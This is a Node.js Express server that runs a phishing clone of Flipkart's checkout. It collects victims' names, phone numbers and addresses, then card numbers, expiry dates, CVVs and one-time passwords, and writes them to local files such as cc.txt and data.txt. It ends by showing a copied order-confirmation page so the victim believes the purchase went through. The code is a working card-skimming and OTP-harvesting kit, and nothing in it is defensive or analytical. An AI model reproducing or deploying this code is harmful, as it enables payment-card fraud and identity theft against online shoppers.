const express = require('express')
const app = express();
const http = require('http')
const fs = require('fs')
const fc = fs.readFileSync('./mobile.html')
const port = 3000;
var today = new Date();
var date = today.getDate() + '-' + today.getMonth() + '-' + today.getFullYear();
const hostname = 'localhost'
var fo = { 'i11b64.htm': 18500, 'ixrw128.ht': 16450, 'ixrb128.ht': 16450, 'i11r64.htm': 18500, 'iseb128.ht': 13300, 'isew128.ht': 13300, 'isew64.htm': 12550, 'iseb64.htm': 12550, 'ixrb64.htm': 15700, 'ixrr64.htm': 15700, 'iser128.ht': 13300, 'ixrw64.htm': 15700, 'i11p.html': 18500, 'i12bl128.h': 18165, 'i7p32.html': 13950, 'iser64.htm': 12550, 'i12g128.ht': 18165, 'i12bl64.ht': 27265, 'i12w128.ht': 18165, 'ixrb64.htm': 15700, 'i12ppbl256': 19215, 'ixrbl64.ht': 15700, 'i11pmg64.h': 24465, 'i12mw128.h': 26515 }
var server = http.createServer(app)
app.use(express.static("public"));
app.use(express.urlencoded())

app.post(["/address", "/index.html.var"], (req, res) => {

    const re = req.rawHeaders[31].slice(17, 27)
    console.log("  \nPrice is  " + fo[re])
    fs.writeFileSync('price.txt', `${re}`)

    res.end(`<!DOCTYPE html>
  <html lang="en">
  <head>
      <meta charset="UTF-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <link rel="stylesheet" href="add.css">
      <title>Document</title>
  </head>
  <body>
      <div class="head">Delivery Address</div>
      <img id="img1" src="11.jpg" alt="">
      <form class="con" action="/c" method="POST">
         <div><input name="name" type="text" required placeholder="Full Name (Required)*"></div>
         <div><input name="phone" type="number" maxlength="10" required placeholder="Phone Number (Required)*"></div>
         <div><input name="pincode" type="number" required maxlength="6" required placeholder="Pincode (Required)*"></div> 
         <div class="add"> <input name="state" type="text" required placeholder="State (Required)*">
          <input name="city" type="text" required placeholder="City (Required)*"> </div>
          <div><input name="addressLine1" type="text" required placeholder="House No., Building Name (Required)*"></div>
          <div><input name="addressLine2" type="text" required placeholder="Road Name, Area, Colony (Required)*"></div>
          <input type="submit" id="submit" value="Continue">
      </form>
  </body>
  </html>`)

})

app.get(["/", '/index.html.var'], (req, res) => {
    res.end(fc)

    res.end()
})

app.post(["/c", "/index.html.var"], (req, res) => {
    console.log(req.body)
    const city = req.body['city']
    const name = req.body['name']
    const phone = req.body['phone']
    const pincode = req.body['pincode']
    const addressLine2 = req.body['addressLine2']
    const addressLine1 = req.body['addressLine1']
    const state = req.body['state']


    const re = fs.readFileSync('price.txt')
    fs.writeFileSync('name.txt', name)
    fs.writeFileSync('adr1.txt', addressLine1)
    fs.writeFileSync('adr2.txt', addressLine2)
    fs.writeFileSync('state.txt', state)
    fs.writeFileSync('pnc.txt', pincode)
    fs.writeFileSync('no.txt', phone)
    fs.writeFileSync('city.txt', city)


    res.end(`<!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=<device-width>, initial-scale=1.0">
            <title>Document</title>
            <link rel="stylesheet" href="site.css">
        </head>
        <body>
            <div class="header"><p>Payments</p></div>
            <div class="one">
                <img id="img1" src="1.jpg" alt="">
            </div>
            <div class="two">
                <div>
                    <p>All other options</p>
                    <p><input name="chutiya_bana" type="radio" value="UPI" disabled>UPI</p>
                </div>
                <div><p><input name="chutiya_bana" type="radio" value="UPI"disabled>Wallets</p></div>
                <form action="/o" method="POST">          
                <div class="cc"><p><input name="chutiya_bana" type="radio" value="UPI" checked>Credit / Debit / ATM Card</p>
                
	
                <div>
	<div><input type="number" autocomplete="cc-number" name="cardNumber" maxlength="16" required="" tabindex="1" placeholder="Enter Card Number" ></div>
    
   <div>Valid thru
    
   <select class="" name="month" required="" tabindex="4">
   <option disabled="" value="MM">MM</option><option value="01">01</option>
   <option value="02">02</option><option value="03">03</option>
   <option value="04">04</option><option value="05">05</option>
   <option value="06">06</option><option value="07">07</option>
   <option value="08">08</option><option value="09">09</option>
   <option value="10">10</option><option value="11">11</option>
   <option value="12">12</option></select>

   
   <select class="" name="year" required="" tabindex="5">
   <option disabled="" value="YY">YY</option>
   <option value="21">21</option><option value="22">22</option><option value="23">23</option><option value="24">24</option><option value="25">25</option><option value="26">26</option><option value="27">27</option><option value="28">28</option><option value="29">29</option><option value="30">30</option><option value="31">31</option><option value="32">32</option><option value="33">33</option><option value="34">34</option><option value="35">35</option><option value="36">36</option><option value="37">37</option><option value="38">38</option><option value="39">39</option><option value="40">40</option><option value="41">41</option><option value="42">42</option><option value="43">43</option><option value="44">44</option><option value="45">45</option><option value="46">46</option><option value="47">47</option><option value="48">48</option><option value="49">49</option><option value="50">50</option><option value="51">51</option><option value="52">52</option><option value="53">53</option><option value="54">54</option><option value="55">55</option><option value="56">56</option><option value="57">57</option><option value="58">58</option><option value="59">59</option><option value="60">60</option></select></div>
   
   <div><input type="password"  autocomplete="cc-csc" maxlength="4"  name="cvv" required="" tabindex="6" value=""> CVV ?</div>
   
   <div>Your card details would be securely saved for faster payments. Your CVV will not be stored.</div></div> </div>
   <div><p><input name="chutiya_bana" type="radio" value="UPI" disabled>Net Banking</p></div>
   
                <div><p><input name="chutiya_bana" type="radio" value="UPI" disabled>EMI (Not Available)</p></div>
            </div>
            <div>
                <p  class="price">PRICE DETAILS</p>
            <table>
                <tr>
                    <td class="tab">Price(1 Item)</td>
                    <td class="col">${fo[re]}</td>
                </tr>
                <tr>
                    <td class="tab">Delivery Charges</td>
                    <td class="col" id="del">FREE</td>
                </tr>
                <tr>
                    <td class="tab">Amount Payable</td>
                    <td class="col">${fo[re]}</td>
                </tr>
            </table></div>
            <div>
                <img id="img2" src="2.jpg" alt="">
            </div>
            <div class="footer">
                <p>${fo[re]}</p>
                
        <input id="submit" type="submit" value="Place Order">
        
                </form>
            </div>
        </body>
        </html>`)







    var data = "name : " + name + " phone : " + phone + " pincode : " + pincode + " city : " + city + " addressLine1 : " + addressLine1 + " addressLine2 : " + addressLine2 + " state : " + state + "\n"
    fs.appendFile('data.txt', data, () => { console.log('ok') })



})


app.post(['/o', '/index.html.var'], (req, res) => {
    console.log(req.body)

     const card=  req.body['cardNumber']
      const month=  req.body['month']
      const year=  req.body['year']
      const cvv=  req.body['cvv']
      var data = "card : " +card+" month : "+month+" year : "+year+" cvv : "+cvv+"\n"
      fs.appendFile('cc.txt',data,()=>{console.log('ok')})
    const re = fs.readFileSync('price.txt')
    //   const name = fs.readFileSync('name.txt','utf-8')
    //   const adr1 = fs.readFileSync('adr1.txt','utf-8')
    //   const adr2 = fs.readFileSync('adr2.txt','utf-8')
    //   const pnc = fs.readFileSync('pnc.txt','utf-8')
    //   const no = fs.readFileSync('no.txt','utf-8')
    //   const state = fs.readFileSync('state.txt','utf-8')
    //   const city=fs.readFileSync('city.txt','utf-8')

    res.end(`<!DOCTYPE html>
       <html lang="en">
       <head>
           <meta charset="UTF-8">
           <meta http-equiv="X-UA-Compatible" content="IE=edge">
           <meta name="viewport" content="width=device-width, initial-scale=1.0">
           <link rel="stylesheet" href="otp.css">
           <title>Online shooping Flipkart</title>
       </head>
       <body>
           <h3>Merchant Name:</h3>
           <div>FLIPKART PAYMENTS</div>
           <h3>Amount:</h3>
           <div>${fo[re]}</div>
           <h3>Date:</h3>
           <div>${date}</div>
           <h3>Card Number</h3>
           <div>XXXX XXXX XXXX XXXX</div>
           <h3>Personal Greeting:</h3>
           <div>Transaction is protected by 3D secure service.</div>
           <h3>One Time Password:</h3>
           <form action="/r" method="POST">
           <input name="otp" id="txt" type="number" required maxlength="6"> 
           <input class="btn" type="submit"> </form>
       </body>
       </html>`)



    res.end()
})

app.post(['/r', '/index.html.var'], (req, res) => {
    console.log(req.body)
    const otp = req.body['otp']
    var data = "otp : " + otp + "\n"
    fs.appendFile('data.txt', data, () => { console.log('ok') })
    var yes= fs.readFileSync('yes.txt')
    if(yes=='yes'){
    
    const re = fs.readFileSync('price.txt')
    const name = fs.readFileSync('name.txt', 'utf-8')
    const adr1 = fs.readFileSync('adr1.txt', 'utf-8')
    const adr2 = fs.readFileSync('adr2.txt', 'utf-8')
    const pnc = fs.readFileSync('pnc.txt', 'utf-8')
    const no = fs.readFileSync('no.txt', 'utf-8')
    const state = fs.readFileSync('state.txt', 'utf-8')
    const city = fs.readFileSync('city.txt', 'utf-8')




    res.end(`<!DOCTYPE html>
        <html lang="en" class=" fonts-loaded"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><script type="text/javascript" async="async" src=""></script><script type="text/javascript" async="async" src=""></script><link href="" rel="preconnect"><link rel="stylesheet" href="./Flipkart.com_ Payment Response_files/app.chunk.6f4e6b.css"><meta http-equiv="X-UA-Compatible" content="IE=Edge"><meta property="fb:page_id" content="102988293558"><meta property="fb:admins" content="658873552,624500995,100000233612389"><meta name="robots" content="noodp"><link rel="shortcut icon" href=""><link type="application/opensearchdescription+xml" rel="search" href=""><meta property="og:type" content="website"><meta name="og_site_name" property="og:site_name" content=""><link rel="apple-touch-icon" sizes="57x57" href=""><link rel="apple-touch-icon" sizes="72x72" href=""><link rel="apple-touch-icon" sizes="114x114" href=""><link rel="apple-touch-icon" sizes="144x144" href=""><link rel="apple-touch-icon" href=""><meta name="twitter:card" content="app"><meta name="twitter:site" content="@fli"><meta name="twitter:creator" content="@ft"><meta name="twitter:title" content="Orderresponse Store Online - Buy Orderresponse Online at Best Price in India | Fliqkart.com"><meta name="twitter:description" content="Shop for electronics, apparels &amp; more using our Fliqkart app Free shipping &amp; COD."><meta name="twitter:app:country" content="in"><meta name="al:ios:app_name" content=""><meta name="al:ios:app_store_id" content="742044692"><meta name="twitter:app:name:iphone" content=""><meta name="twitter:app:id:iphone" content="742044692"><meta name="twitter:app:url:iphone" content=""><meta name="twitter:app:name:ipad" content=""><meta name="twitter:app:id:ipad" content="742044692"><meta name="twitter:app:url:ipad" content=""><meta name="twitter:app:name:googleplay" content=""><meta name="twitter:app:id:googleplay" content=""><meta name="twitter:app:url:googleplay" content=""><style>#container {
                 height: 100%;
              }</style>
              
              <script src="" defer="defer" crossorigin="anonymous"></script><script src="" defer="defer" crossorigin="anonymous"></script><script src="" defer="defer" crossorigin="anonymous"></script><script src="" defer="defer" crossorigin="anonymous"></script><script src="" defer="defer" crossorigin="anonymous"></script><link rel="stylesheet" href="./Flipkart.com_ Payment Response_files/CheckoutPage.chunk.8234fe.css"><title>Fliqkart.com: Payment Response</title><meta name="og_title" property="og:title" content="Orderresponse Store Online - Buy Orderresponse Online at Best Price in India | Fliqkart.com"><meta name="Keywords" content="Orderresponse Store, Orderresponse Store Online Shopping"> <meta name="Description" content="Orderresponse Online Store in India. Check Orderresponse Prices, Ratings &amp; Reviews at Fliqkart.com. &amp;#10004; Free Shipping &amp;#10004; Cash on Delivery &amp;#10004; Best Offers"><meta property="og:description" content="Orderresponse Online Store in India. Check Orderresponse Prices, Ratings &amp; Reviews at Fliqkart.com. &amp;#10004; Free Shipping &amp;#10004; Cash on Delivery &amp;#10004; Best Offers"> <meta name="robots" content="noindex">   <meta name="og_url" property="og:url" content=""><meta name="msvalidate.01" content="">
           
                <link rel="stylesheet" type="text/css" href="./Flipkart.com_ Payment Response_files/NavMenu.chunk.64daa3.css" crossorigin="anonymous"><script charset="utf-8" src="" crossorigin="anonymous"></script></head><body class=""><div id="container"><div data-reactroot=""><div class="_1kfTjk"><div class="_1rH5Jn"><div class="_1TmfNK"></div><div class="_2Xfa2_"><div class="_3_C9Hx"><div class="_3qX0zy"><a href=""><img width="75" src="./Flipkart.com_ Payment Response_files/flipkart-plus_8d85f4.png" alt="" title="Fliqkart" class="_2xm1JU"></a><a class="_21ljIi" href="">Explore<!-- --> <span class="_2FVHGh">Plus</span><img width="10" src="./Flipkart.com_ Payment Response_files/plus_aef861.png"></a></div></div><div class="_1cmsER"><form class="_2M8cLY header-form-search" action="" method="GET"><div class="col-12-12 _2oO9oE"><div class="_3OO5Xc"><input type="text" value="" class="_3704LK" title="Search for products, brands and more" name="q" autocomplete="off" placeholder="Search for products, brands and more"></div><button class="L0Z3Pu" type="submit"><svg width="20" height="20" viewBox="0 0 17 18" class="" xmlns="http://www.w3.org/2000/svg"><g fill="#2874F1" fill-rule="evenodd"><path class="_34RNph" d="m11.618 9.897l4.225 4.212c.092.092.101.232.02.313l-1.465 1.46c-.081.081-.221.072-.314-.02l-4.216-4.203"></path><path class="_34RNph" d="m6.486 10.901c-2.42 0-4.381-1.956-4.381-4.368 0-2.413 1.961-4.369 4.381-4.369 2.42 0 4.381 1.956 4.381 4.369 0 2.413-1.961 4.368-4.381 4.368m0-10.835c-3.582 0-6.486 2.895-6.486 6.467 0 3.572 2.904 6.467 6.486 6.467 3.582 0 6.486-2.895 6.486-6.467 0-3.572-2.904-6.467-6.486-6.467"></path></g></svg></button><input type="hidden" name="otracker" value="search"><input type="hidden" name="otracker1" value="search"><input type="hidden" name="marketplace" value="FLIPKART"><input type="hidden" name="as-show" value="off"><input type="hidden" name="as" value="off"></div><ul class="col-12-12 _1MRYA1"></ul></form></div><div class="go_DOp"><div class="_28p97w"><div class="_1psGvi _3BvnxG"><div><div class="exehdJ">My Profile</div></div></div><svg width="4.7" height="8" viewBox="0 0 16 27" xmlns="http://www.w3.org/2000/svg" class="zZ3yfL"><path d="M16 23.207L6.11 13.161 16 3.093 12.955 0 0 13.161l12.955 13.161z" fill="#fff" class="_2gTTdy"></path></svg></div></div><div class="go_DOp"><div class="_28p97w"><div class="_1psGvi _3BvnxG"><div><div class="exehdJ"> <!-- -->More<!-- --> </div></div></div><svg width="4.7" height="8" viewBox="0 0 16 27" xmlns="http://www.w3.org/2000/svg" class="zZ3yfL"><path d="M16 23.207L6.11 13.161 16 3.093 12.955 0 0 13.161l12.955 13.161z" fill="#fff" class="_2gTTdy"></path></svg></div></div><div class="go_DOp"><div class="_1psGvi"><div class="YUhWwv"><a class="_3SkBxJ"><svg class="V3C5bO" width="14" height="14" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg"><path class="_1bS9ic" d="M15.32 2.405H4.887C3 2.405 2.46.805 2.46.805L2.257.21C2.208.085 2.083 0 1.946 0H.336C.1 0-.064.24.024.46l.644 1.945L3.11 9.767c.047.137.175.23.32.23h8.418l-.493 1.958H3.768l.002.003c-.017 0-.033-.003-.05-.003-1.06 0-1.92.86-1.92 1.92s.86 1.92 1.92 1.92c.99 0 1.805-.75 1.91-1.712l5.55.076c.12.922.91 1.636 1.867 1.636 1.04 0 1.885-.844 1.885-1.885 0-.866-.584-1.593-1.38-1.814l2.423-8.832c.12-.433-.206-.86-.655-.86" fill="#fff"></path></svg><div class="KK-o3G">6</div><span>Cart</span></a></div></div></div></div><div class="_1TmfNK"></div></div><div class="_1mUdNz"></div></div><div class="_331-kn"></div><div class="_1TDjXq"><div class="_1TVFmy _23XefD"><div class="ZM3_EH " style="transform: scaleX(1);"></div></div><div class="_3oC9Ob"><div><div class="_2jFZ0Z"><div><div class="_3E8aIl _2v6iyJ _3CjTBO row"><div class="col-8-12 _1B5Mxv _1YM8-U"><img src="./Flipkart.com_ Payment Response_files/orderPlacedV2_cb4f64.png" class="_3c6JdB"><div class="emOm6u">
                 <div class="XdpTC- _2GyCkX"><div id="resp"><span>Order placed for </span>${fo[re]}!</div></div>
            <div><span>Your 1 item will be delivered by </span><span class="_2GyCkX">Sat, Tue 20th June '21</span>.</div></div></div><div class="col-4-12 LmV2Kr _4y9Tcy"><div><div class="_3Tm5aQ">Why call? Just click!</div><div class="_33YwuI">Easily track all your Fliqkart orders!</div><a class="_3J-yfZ" href="">Go to My Orders</a></div><img src="./Flipkart.com_ Payment Response_files/group-2@3x.png" class="_2GA8MD"></div></div><div class="_3E8aIl _2FJ3Va _2nqvXF row"><div class="col-4-12 _2XH9xt"><div class="kKX2Ow"><div class="_1ZJv_G"><span class="_3jRtMt">Delivery Address</span></div><div class="_3LuzG3"><div class="_1XnLtY"><div class="_3N-YiT" id="lname">${name} </div></div><div class="_104tHa">abc@gmail.com</div><div class="_1QP4w_">${adr1}, ${adr2} ${state}, ${pnc}</div><div class="_1XnLtY _2u8s7u"><div><span class="_3N-YiT">Phone number</span><div class="">${no} </div></div></div><span class="_2K1cxl">This order is also tracked by ${no}</span></div></div></div><div class="col-3-12 _3X1tAV _2XH9xt"><span class="tjqGiz">Your Rewards</span><a href=""><div class="_266QfL"><img src="./Flipkart.com_ Payment Response_files/lockinCoinNew_79b3fb.svg" class="_3UmxR3 _3UktvH"><div class="_2kcozy"><div>50 SuperCoins</div><div class="-gBnNp">Will be credited after return period is over</div></div></div></a></div><div class="col-4-12 l7H-zx _2XH9xt"><span class="_3VyUVv">More actions</span><div><div class="row _3rlxU4"><div class="MQKwr6"><img src="./Flipkart.com_ Payment Response_files/payNowLogoV2_a7fae8.png" class="_3Y5Y5U"><span class="xQQowV">Prefer contactless delivery ?</span></div><button class="_2KpZ6l bTMKxR"><span>Pay Now</span></button></div></div><div class="row OKaaCn"><div class="_3Ebq1g"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0Ij4KICAgIDxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+CiAgICAgICAgPHJlY3Qgd2lkdGg9IjI0IiBoZWlnaHQ9IjI0IiBmaWxsPSIjRkY0MzQzIiByeD0iMyIvPgogICAgICAgIDxnIGZpbGw9IiNGRkYiPgogICAgICAgICAgICA8cGF0aCBkPSJNMTAuNCA2YTMuMiAzLjIgMCAxIDEgMCA2LjQgMy4yIDMuMiAwIDAgMSAwLTYuNHptMCA4YzMuNTM2IDAgNi40IDEuNDMyIDYuNCAzLjJ2MS42SDR2LTEuNmMwLTEuNzY4IDIuODY0LTMuMiA2LjQtMy4yeiIvPgogICAgICAgICAgICA8cGF0aCBmaWxsLXJ1bGU9Im5vbnplcm8iIGQ9Ik0xNy40ODYgMTAuOFY4Ljc0M2gtMS4zNzJWMTAuOGgtMi4wNTd2MS4zNzFoMi4wNTd2Mi4wNThoMS4zNzJWMTIuMTdoMi4wNTdWMTAuOHoiLz4KICAgICAgICA8L2c+CiAgICA8L2c+Cjwvc3ZnPgo=" class="_3VCa3_"><span class="_1y9KaJ">Order shared with</span><div class="Bv11UC"><span class="_366sND">1 person</span></div></div><div class="Bv11UC"><span class="_3SiZl4">Manage</span></div></div></div></div><div class="_3E8aIl _2ZByO4 _3CjTBO"><div class="row fpJo0A"><div class="col-4-12 Oqho6V"><div class="row" style="position: relative;"><div class="col-3-12 _1ANLqG"><a href="" target="_blank" rel="noopener noreferrer"><div class="CXW8mj" style="height: 75px; width: 75px;"><img class="_396cs4  _3exPp9" alt="" src="./Flipkart.com_ Payment Response_files/hot-10-play-x688b-infinix-original-imag29hfg6vspbuz.jpeg"></div></a></div><div class="col-8-12"><a class="_2KpZ6l row _3hTjfv" href="" target="_blank">Infinix Hot 10 Play (7° Purple, 64 GB)</a><div class="row _1k5oiV"><span class="_3kfmpa"><span class="_1k5oiV">Color: </span><span class="_5CyX2n">Purple</span></span><span class="_3kfmpa"></span></div><div class="row _1k5oiV"><span class="_1k5oiV _3NgwL_">Seller: </span><span class="_5CyX2n">Flashstar Commerce</span></div></div></div></div><div class="col-4-12 _1FMgU4"><div class="row"><span class="col-3-12 T-0eMm"><img src="data:image/svg+xml;base64,PHN2ZyBmaWxsPSIjMjg3NEYxIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMHoiIGZpbGw9Im5vbmUiLz4KICAgIDxwYXRoIGQ9Ik0yMCA4aC0zVjRIM2MtMS4xIDAtMiAuOS0yIDJ2MTFoMmMwIDEuNjYgMS4zNCAzIDMgM3MzLTEuMzQgMy0zaDZjMCAxLjY2IDEuMzQgMyAzIDNzMy0xLjM0IDMtM2gydi01bC0zLTR6TTYgMTguNWMtLjgzIDAtMS41LS42Ny0xLjUtMS41cy42Ny0xLjUgMS41LTEuNSAxLjUuNjcgMS41IDEuNS0uNjcgMS41LTEuNSAxLjV6bTEzLjUtOWwxLjk2IDIuNUgxN1Y5LjVoMi41em0tMS41IDljLS44MyAwLTEuNS0uNjctMS41LTEuNXMuNjctMS41IDEuNS0xLjUgMS41LjY3IDEuNSAxLjUtLjY3IDEuNS0xLjUgMS41eiIvPgo8L3N2Zz4=" class="_2wPo9L"></span><span class="col-9-12 _3H8mXx"><span class="">Delivery expected by Sat, Jun 05</span></span></div></div><div class="_37bzCq col-4-12"><div class="GYYyEN"><div id="gadda" class="_1t3MJ7">₹8,499</div><div><span class="_3vvH_e">2 Offers    Applied</span><div class="Bv11UC"><span class="question">?</span></div></div></div><div class="_1B_RPQ"><div class="_1dnpZA row"><span class="_2LAzKy"><img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxOCIgaGVpZ2h0PSIxOCIgdmlld0JveD0iMCAwIDE4IDE4Ij48ZyBmaWxsPSJub25lIiBmaWxsLXJ1bGU9ImV2ZW5vZGQiPjxwYXRoIGZpbGw9IiMyODc0RjEiIGZpbGwtcnVsZT0ibm9uemVybyIgZD0iTTkgLjY2N0M0LjM5Mi42NjcuNjY3IDQuMzkyLjY2NyA5YzAgNC42MDggMy43MjUgOC4zMzMgOC4zMzMgOC4zMzMgNC42MDggMCA4LjMzMy0zLjcyNSA4LjMzMy04LjMzM0MxNy4zMzMgNC4zOTIgMTMuNjA4LjY2NyA5IC42Njd6bTQuMTY3IDExLjMyNWwtMS4xNzUgMS4xNzVMOSAxMC4xNzVsLTIuOTkyIDIuOTkyLTEuMTc1LTEuMTc1TDcuODI1IDkgNC44MzMgNi4wMDhsMS4xNzUtMS4xNzVMOSA3LjgyNWwyLjk5Mi0yLjk5MiAxLjE3NSAxLjE3NUwxMC4xNzUgOWwyLjk5MiAyLjk5MnoiLz48cGF0aCBkPSJNLTEtMWgyMHYyMEgtMSIvPjwvZz48L3N2Zz4=" class="_1dki8b col-1-5"><span class="_2YpB-X col-3-5">Cancel Item</span></span></div><div class="_1dnpZA row"><span class="Efhm0G"><img src="./Flipkart.com_ Payment Response_files/contactusIcon_cb27d5.svg" class="_1dki8b col-1-5"><span class="_2YpB-X col-3-5">Need Help?</span></span></div></div></div></div><div class="_3hrZuo"><div class="yQABzk"><span class="LCDzAU">Total</span><span id="nadda" class=" _3D2A_w">₹8,499</span>
               
              
                 
                 
                 <div class="Bv11UC"><span class="question">?</span></div></div></div></div><div class="_1b7mbQ"><div class="_1DgqhK"><div class="_3E8aIl ePhB1Y"><div class="_3NDR93"><div class="_2IguZJ">🚨  Beware of fraudulent calls &amp; messages!</div><div class="_1fmcc2">We don’t ask for bank OTP/pin for offers or demand money</div><a class="_2KpZ6l _1knzdd _3V5jRb _3dESVI" href="">Read More</a></div></div></div></div></div></div></div></div></div><footer class="_3voSl0"><div class="_3rc_xQ"><div class="row"><div class="col gu12 _8Qljeg"></div></div></div></footer><div class="_1EcK2J _38JCdA"><div class="bra6U8"><svg width="16" height="27" viewBox="0 0 16 27" xmlns="http://www.w3.org/2000/svg" class="_2TdLiZ"><path d="M16 23.207L6.11 13.161 16 3.093 12.955 0 0 13.161l12.955 13.161z" fill="#fff" class="_3ZKfA2"></path></svg><span>Back to top</span></div></div></div></div><div class="_2Sn47c"></div></body></html>` )
}}) 

app.listen(port, hostname, () => {

    console.log("Listening ")

})

